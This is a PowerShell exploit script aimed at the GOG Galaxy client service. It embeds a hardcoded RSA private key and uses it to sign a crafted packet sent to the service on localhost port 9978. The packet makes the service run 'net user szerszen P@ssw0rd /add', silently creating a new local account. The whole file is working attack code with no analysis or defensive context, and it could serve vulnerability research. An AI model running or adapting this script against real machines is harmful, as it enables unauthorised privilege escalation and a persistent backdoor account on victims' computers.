$pathGOGService = [Environment]::ExpandEnvironmentVariables('%PROGRAMFILES(x86)%\\GOG Galaxy\\GalaxyClientService.exe')
$pathGOGLog = [Environment]::ExpandEnvironmentVariables('%PROGRAMDATA%\\GOG.com\\Galaxy\\logs\\GalaxyClientService.log')    
$RSAPrivateKey = "-----BEGIN RSA PRIVATE KEY-----`nMIIJKQIBAAKCAgEA7vrjT2vQK8l0ELjt6pGLySpXTjKnqNy/T/A9P+hTpmj5kKNV`ndTwhVR2p2FD5powfZwQDehRT6zxfyc6R7WlA2yiTnY94z7VeF6wtQYRLMGbraB+L`nPTCErr/AYh5ego8OThFWjiBSIUSWkfXAtlpXgOBckjWCCxfrlZffR+xRd6eNIWvl`nFN9w41sKDBwDwvvFQvgEki1E0VJdlYes+y2BhbMeAsZK1W6e1IyD6ZAj/h4PxZDA`nB97Surepq2JIoyqoZP2X65xZDZcrVbXDyoNUfquxJX1YuBI+rsQg0k1x2rs+87bX`nNaYalHlNzywdwojDzSCJX4RL1RXu0FkzI8szlRk3wfvekMLaOaiJpRj0Em5n/CPP`nfpy6ZBAcAce3fF9jGd6w3Ig0+pBVtlS2zrR1TK3rPBEOXCLj0Ru+kbwr5iQ9F5Kw`nqjUToo0FGlAJC43lZfiHKOuRMEr81/XqLBMfaU9LKF+zdGVXJ9RNTVQVfyAlvfBk`npTaGW6zx747PRp80ArfNMxmgw3BV6RkTjd9RuW/7b23Ic6O5+HvB1kP7JjS2BE3f`nFfS5ujhoK+YEMuefoerbRNfDJ6cgN4otetqjkwWTrS/aIwvC0lZCJJeFobdcvd6M`ng2TKKLKHxlSLyxQ5ii246yO25OmsbI+Lm05rbnK9ZvVFT8U17rl9ZrMO7NUCAwEA`nAQKCAgEA6+nQK78Kqa8dXMSyWTWFAPlDZnaq/A+u7IMEc+otacGHXDlhS3IolZXK`n7ThCux7ogRF9PS6ECVx4UwgRFoUo+TB9SLUxVhp84HGf22V1tDpleUxqb+VNlhTF`nHhdMxSXjwT1sbLGLYjwLR9uKenmEmDzkJZGc5saeUfay/JVVdwF4WN3iL1DEaCyf`nJoUhUYKpoQqluIfnv5vHtq1RHkQ18H55ydNmXHvvX3O3ZQJeBaY3e5kBeMOG07wr`nSnyjqC+cPNX6+yRE5R2uMdZVib1L1CA5qACtbEjWiEAlBnZdRshBxOViXhuzcY6u`nOS4b0sagRAcylZBMK/aS4iqsSVF3gHgUSc04Z7XjSDpDvuOJF8zeTv1oZjm6bddP`n34l2pPMs6Z9roDvvRVrz+ikgJHLBICPq7zfmEdzYE/h7QQcrdTl7M2U1wNFrqC4f`nWBLg1dWRZh0JUWpcX2uUcrG+GzYUoWXp/Z6enfHo9xUY2N9LKEJyVR8/ktKTKkOo`niqhnVdQTtbwCpglLzmot1TaV93K2UQH1EEP18NPrK8qkfTiaFYdHRjcc0OCaIItl`nOT8YJu0D/9pIGg6kDrZQMstVwcKKgNmukfH2Ybzh8nmB2T9+zK89MbvV13AUnYZK`noEQtCwKzIRdj5hkvMu5s8eIeipooDKdTkmt3eczcfp8/tXFesKECggEBAPtErdFd`nZoKhE3O7nQpYpfhC3/ZGC5RjeoUMVxZfJhqJxxpy+7OSFsVLiCAb8IBc6Ajbgyg4`nchh1lf2g18WQk5wSl9P/kVNftatpfTiu2pY66CQuPU9o0YEz0QlqUAEmqjjqPB7f`nTONdVC+VmOcauxinUq2ywmH3KuiX00LPmD9udGs15jrGJLj8BV363GEJd9vPDqgk`npcypsVPhksoIxZJpggfewrF2BwPPmwnxxPZdovEGng8F/7J8yyb+5B3oNv2utW1Y`nXejs+e7rxR1BGFnD5LZ9H8QCfTB0NYTIq44uWfMCcJaMPkEQ+XUDdLJIoAxl3TFZ`naPA6le4TeeD0CWcCggEBAPN6+C0np51HfysqbhYcDzY1NSO53kYY5n9Tcj7KRbSu`naSlkiAGe/bXbV2as26jZ7MazBZmkxwyzvmRMyuO43xhzgm8azbPY/ORdIeDWZ9VK`ndw+0QNgncfjHWyq7QgRMCOYG4UQq330jCeCcTIfvLnciJOpLH5G12stuiP+7cDhq`n4vq6Ta2PBvdv7KPpcGgJf/CFUmVx9X9UZvp7B2/Z8lcIvmz9ORf6qmo6yH5NWUAy`nFebGKuuRUsbGBMu9HU37s8OVZw8tA1OiR9mQ3KOcJKURfAVuL2d/qaEA5P0qzIX0`nwtlJ0IIhI1QOIxz/0o+nMf3AHy8p5PqQXkmx9HomJmMCggEAWfjmsKBcM4xP9dIJ`nUooZrALuRTYhsVnJplib2oPplfkd1Ue0/0DhbHY2YSEABka+Q2Wu2jkUCdQZCD+O`n48x4PpudyCisNgmAeMeGMkTSOpcPRt1T0Np8omIWiOOLkE3zB/w/2OImmwdxPLS5`nko9MzXAkt9PZrNCfibfLyxGgt53qi/U54nPO9HoxxcwtG4YTaB8FZYnx4I4m1B1i`nvXtUm6+yAvVuC7NyoZe2MWJkH7+5t8qh0ElanOP4rpb4wgjDoCTuDCBnSB+LA1Vj`nOK11dbcib4HwXPRzNWV3QHvGilvok46dGBtRs2TLnm3FXI2K2cWj5abZX6Pqydwp`neTaJIwKCAQAoTF8NIjYUywOaQmCMGkLORwovipDmazKjOk17ZQEagY94QWJdWlJF`nqjMSFGQa007kKDcyEdq8GHfXo/okrLGIG34oI3iOXsikh2GXFAWFgNip6bydyhGM`nCnrlXK71hRwn7lWUccAhtw3odhYYnZbEMwuHF7324PGAoB/eq8hMHizJMNKwei69`n/3FcQ8POBFx/k6Fqluz6ER8mL/ywH5ODojfaVCMB/AP+pxIODYFLJb8IPh5WdOwN`naDLdAcT65kD/ixfOpDWbvw1DTj2meq55/6XWREFmUPPjaQF9gXruZO9nBVeUYiW1`nwM1A/Hp+Oj8E76p5pOZ4LjLc4a5EFVJfAoIBAQDZGaXtYKap9Zt5WYJor2ikSCkA`n8vv0B9sAXjecxaGNQdqsTcbeSgxIQ68t1lliiq4ZEJv5VUIkm24QfpdX2rzQCN8w`nze4j6jQx4eLCwAh9PhTACss4Q5nqUvr//zU/vJBm55WjNUCIbynJwUFkZiwINLld`no0dt+kkvY7WutZDceP4cPL4pYW+w+3bn8yhZji5UR6DsBMjG4TOpCbT+WixB+zz2`n76HC9YV4lnWBOLKwdtwQPItsS3IRFci2wk9j0jlkvQS8EHzwzOjW4Z2cQ5uQKsQJ`ncJ7a7E22pI2vwYaTB5uJjJ5U/sOQE04Ps5Jj93+isEMmguzlh2JRPZ34LOfA`n-----END RSA PRIVATE KEY-----"

function InitialCheck {
    if (-not(Get-Item -Path $pathGOGLog -ErrorAction Ignore)) {
        Write-host "logs not found"
    }else {
        Write-host "logs found"
    }

    if (-not(Get-Item -Path $pathGOGService -ErrorAction Ignore)) {
        Write-host "service not found"
    }else {
        Write-host "service found"
    }
}
function StartGOGService {
    Write-host "Starting GOG service"
    Start-Service -Name "GalaxyClientService"
    Write-host "Started GOG service"
}
function send_payload {

    $encAscii = [System.Text.Encoding]::ASCII

    $command = "C:\Windows\System32\net.exe"
    $args = "user szerszen P@ssw0rd /add"
    $working_dir = "C:\"
    
    [byte[]] $header1 = 0x00,0x93,0x08,0x04,0x10,0x01,0x18
    [byte[]] $header2 = 0x20,0xa1,0x90,0xec,0xe6,0x05,0xc2,0x0c,0x83,0x01,0x0a,0x80,0x01
    [byte[]] $byte1 = 0x0a #"`n" (newline)
    [byte[]] $byte2 = 0x12 
    [byte[]] $byte3 = 0x22 # " (double qote)
    [byte[]] $byte4 = 0x20 #(space)
    [byte[]] $byte5 = 0x1a #(1a)
    [byte[]] $byte6 = 0x20,0x01,0x28,0x01 # \x01(\x01
    [byte[]] $payload = $byte1 + $encAscii.GetByteCount($command)  + $encAscii.GetBytes($command) + $byte2 + ($encAscii.GetByteCount($command+$args)+$byte3.Length+$byte3.Length+$byte4.Length+$byte4.Length)  + $byte3 + $encAscii.GetBytes($command) + $byte3 + $byte4 + $encAscii.GetBytes($args) + $byte4 + $byte5 + $encAscii.GetByteCount($working_dir) + $encAscii.GetBytes($working_dir) + $byte6

    $hmacsha = New-Object System.Security.Cryptography.HMACSHA512
    $hmacsha.key = $encAscii.GetBytes($RSAPrivateKey)
    $signature = $hmacsha.ComputeHash($payload)
    $signature = -join($signature |ForEach-Object ToString X2).ToLower()
    [byte[]] $signature = $encAscii.GetBytes($signature)
    [byte[]] $data = $header1 + $payload.Length + $header2 + $signature + $payload 
    
    $FTPServer = "localhost"
    $FTPPort = "9978"
    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
    while (!$tcpConnection.Connected){
        $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
        }

    $tcpStream = $tcpConnection.GetStream()
    $reader = New-Object System.IO.StreamReader($tcpStream)
    $writer = New-Object System.IO.StreamWriter($tcpStream, $encAscii)
    $writer.AutoFlush = $true
    
    if ($tcpConnection.Connected){
        Write-Host  "Sending packet"
        Write-Host  $data
        $writer.BaseStream.Write($data, 0, $data.Length)
    }
    
    $reader.Close()
    $writer.Close()
    $tcpConnection.Close()
    Write-Host  "connections Closed"
}

# MAIN ----------------------

InitialCheck
StartGOGService
Write-host "send_payload"
send_payload
Write-host "send_payload end"

# MAIN ----------------------